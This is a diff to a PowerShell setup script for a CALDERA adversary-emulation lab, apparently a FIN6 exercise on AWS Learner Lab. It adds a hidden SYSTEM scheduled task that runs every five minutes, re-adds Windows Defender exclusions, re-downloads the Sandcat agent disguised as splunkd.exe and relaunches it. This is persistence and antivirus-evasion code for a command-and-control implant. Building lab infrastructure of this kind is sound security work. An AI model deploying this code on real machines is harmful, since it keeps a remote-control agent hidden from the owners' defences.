@@ -106,28 +106,56 @@ for ($i = 1; $i -le 120; $i++) {   # up to 120 * 30s = 60 min
 }
 if (-not $deployed) { Write-Output "sandcat deploy gave up after 60 min" }
 
-# --- 3. Persist the agent across reboots / Learner Lab stop-start -------
-# This userdata runs ONCE (persist=false). When a stopped lab is resumed the
-# victim boots WITHOUT re-running it, so the agent process stays down and shows
-# "dead" in CALDERA. Register a SYSTEM AtStartup task that re-asserts the Defender
-# exclusion (in case a signature update reset it) and relaunches the agent if it
-# isn't already running. The server's PRIVATE IP is stable across stop/start, so
-# the $server URL baked into the boot script stays valid; it only changes if the
-# server is recreated, in which case victims are rebuilt and this is regenerated.
-$bootScript = "$pub\start-sandcat.ps1"
+# --- 3. Self-healing watchdog: survive reboots AND mid-session quarantine ----
+# Two failure modes must be recovered automatically:
+#   (a) Learner Lab stop-start. This userdata runs ONCE (persist=false); on resume
+#       the victim boots WITHOUT re-running it, so the agent process stays down.
+#   (b) Defender re-quarantines the agent DURING a running session. A signature/
+#       platform update can silently reset the exclusions; splunkd.exe (a known
+#       hacktool signature) is then quarantined -- sometimes the process is killed,
+#       sometimes the file itself is deleted. A boot-only task can't recover this.
+# So we register a SYSTEM task that runs AtStartup AND every 5 minutes, and whose
+# script: re-asserts the exclusions, RE-DOWNLOADS the agent if the binary is gone
+# (or truncated by quarantine), and relaunches it if it isn't running. The server's
+# PRIVATE IP is stable across stop/start, so the $server URL baked in stays valid;
+# it only changes if the server is recreated, in which case victims are rebuilt and
+# this is regenerated. The exclusion is agent-only, so Defender still blocks the
+# real attack tools used by the FIN6 emulation -- only the observer agent survives.
+$watchdog = "$pub\start-sandcat.ps1"
 @"
+# sandcat watchdog (SYSTEM, AtStartup + every 5 min). Keeps the observer agent
+# excluded, present on disk, and running. Safe to run when nothing is wrong (no-op).
 Add-MpPreference -ExclusionPath '$pub' -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath '$agentPath' -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess 'splunkd.exe' -ErrorAction SilentlyContinue
+
+# Re-download if Defender quarantined/removed the binary, or it never landed.
+`$need = -not (Test-Path '$agentPath')
+if (-not `$need) { try { if ((Get-Item '$agentPath').Length -lt 100000) { `$need = `$true } } catch { `$need = `$true } }
+if (`$need) {
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        `$wc = New-Object System.Net.WebClient
+        `$wc.Headers.add('platform','windows')
+        `$wc.Headers.add('file','sandcat.go')
+        `$data = `$wc.DownloadData('$server/file/download')
+        if (`$data.Length -ge 100000 -and `$data[0] -eq 0x4D -and `$data[1] -eq 0x5A) {
+            [io.file]::WriteAllBytes('$agentPath', `$data)
+        }
+    } catch { }
+}
+
+# (Re)launch if the binary is present but the process is not running.
 if ((Test-Path '$agentPath') -and -not (Get-Process splunkd -ErrorAction SilentlyContinue)) {
     Start-Process -FilePath '$agentPath' -ArgumentList '-server $server -group $group' -WindowStyle hidden
 }
-"@ | Set-Content -Path $bootScript -Encoding ASCII
+"@ | Set-Content -Path $watchdog -Encoding ASCII
 
-$act  = New-ScheduledTaskAction  -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$bootScript`""
-$trg  = New-ScheduledTaskTrigger -AtStartup
+$act  = New-ScheduledTaskAction  -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdog`""
+$trgBoot = New-ScheduledTaskTrigger -AtStartup
+$trgLoop = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
 $prin = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName "sandcat" -Action $act -Trigger $trg -Principal $prin -Force -ErrorAction SilentlyContinue
-Write-Output "registered AtStartup task 'sandcat' for resume-after-stop"
+Register-ScheduledTask -TaskName "sandcat" -Action $act -Trigger @($trgBoot, $trgLoop) -Principal $prin -Force -ErrorAction SilentlyContinue
+Write-Output "registered self-healing task 'sandcat' (AtStartup + every 5 min)"
 </powershell>
 <persist>false</persist>
